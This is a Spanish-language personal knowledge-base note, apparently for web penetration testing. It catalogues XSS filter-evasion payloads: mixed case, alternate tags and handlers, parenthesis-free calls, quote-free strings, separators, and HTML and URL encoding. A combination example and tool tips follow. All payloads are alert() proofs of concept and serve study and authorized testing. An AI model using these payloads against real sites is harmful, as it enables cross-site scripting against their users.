---
tipo: meta
aliases:
  - Payloads XSS evasión
  - XSS filter bypass
tags:
  - meta/referencia
  - dominio/web
---

# XSS evasión - matriz de referencia

> [!info] Referencia pura, no un zettel
> Cuando un filtro bloquea el payload básico. Las primitivas se combinan. `yi``  ` copia. Para CSP, que es su propio mundo, ver [[XSS bypass de CSP - matriz de referencia]].

## Palabras/tags bloqueados

`<ScRiPt>alert(1)</ScRiPt>`
Case mixto contra listas negras que no normalizan.

`<img src=x onerror=alert(1)>`  /  `<svg onload=alert(1)>`
Si filtran `script`, cualquier otro tag con handler.

`<img src=x oNeRrOr=alert(1)>`
Case mixto también en el atributo del handler.

`<<script>alert(1)//<</script>`
Tag anidado: si el filtro borra un `<script>` y no repite, queda uno válido.

`<svg><script>alert(1)</script></svg>`
Dentro de SVG el parser cambia las reglas — a veces pasa lo que afuera no.

## `alert` / paréntesis bloqueados

`onerror=alert;throw 1`
`throw` pasa su argumento a `onerror` sin usar paréntesis.

`onerror=eval('ale'+'rt(1)')`
Concatenar el nombre de la función parte firmas por texto.

`<svg onload=alert&lpar;1&rpar;>`
Entidades HTML para los paréntesis dentro de un handler.

`<script>alert`1`</script>`
Template literal: `alert\`1\`` llama a alert sin paréntesis.

`location='javascript:alert%281%29'`
Paréntesis URL-encodeados en un contexto de navegación.

## Comillas bloqueadas

`<img src=x onerror=alert(document.domain)>`
Sin comillas: `document.domain` no las necesita. Para strings, `String.fromCharCode(...)`.

`<img src=x onerror=alert(/xss/.source)>`
Un regex literal da un string sin comillas (`.source`).

`<svg onload=alert(String.fromCharCode(88,83,83))>`
Construir el string por códigos de carácter.

## Espacios / separadores filtrados

`<img/src=x/onerror=alert(1)>`
La barra `/` separa atributos igual que el espacio.

`<svg onload=alert(1)>`  con  `%09` `%0a` `%0c`
Tab, newline y form-feed cuentan como separador entre nombre de tag y atributo.

## Codificación

`<a href="javas&#99;ript:alert(1)">`
Entidad HTML dentro del esquema — el parser la decodifica antes de que el filtro de `javascript:` actúe.

`%3Cscript%3Ealert(1)%3C/script%3E`
URL-encode si el filtro corre antes de la decodificación del server.

`&#x3C;script&#x3E;`  /  doble encode `%253C`
Cuando hay dos capas de decodificación (proxy + app).

## Combinación — ejemplo

Filtran `script`, `onerror` en minúsculas y paréntesis:

```
<script>alert(1)</script>          bloqueado (script)
<img src=x onerror=alert(1)>       bloqueado (onerror, paréntesis)
<img src=x oNeRrOr=alert`1`>       case mixto + template literal → pasa
<svg oNlOaD=alert`document.domain`> variante sin img
```

> [!tip] Método antes que payload
> Identificá qué normaliza el filtro (case, encoding, qué keyword busca) y atacá ese hueco. Burp Intruder con una lista de payloads XSS, o el escáner de DOM Invader, automatizan la búsqueda.

## Relacionadas

[[MOC - Cross-site scripting]] · [[XSS contextos - matriz de referencia]] · [[XSS bypass de CSP - matriz de referencia]]
